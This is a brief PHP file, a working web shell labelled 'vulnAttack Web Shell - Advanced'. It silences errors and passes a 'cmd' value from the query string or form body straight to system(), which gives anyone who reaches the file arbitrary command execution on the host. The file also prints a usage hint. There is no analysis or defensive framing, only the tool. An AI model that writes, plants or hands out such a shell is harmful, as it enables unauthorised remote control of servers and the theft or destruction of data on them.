<?php
error_reporting(0);
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} elseif (isset($_POST['cmd'])) {
    system($_POST['cmd']);
} else {
    echo "vulnAttack Web Shell - Advanced\n";
    echo "Usage: ?cmd=whoami\n";
}
?>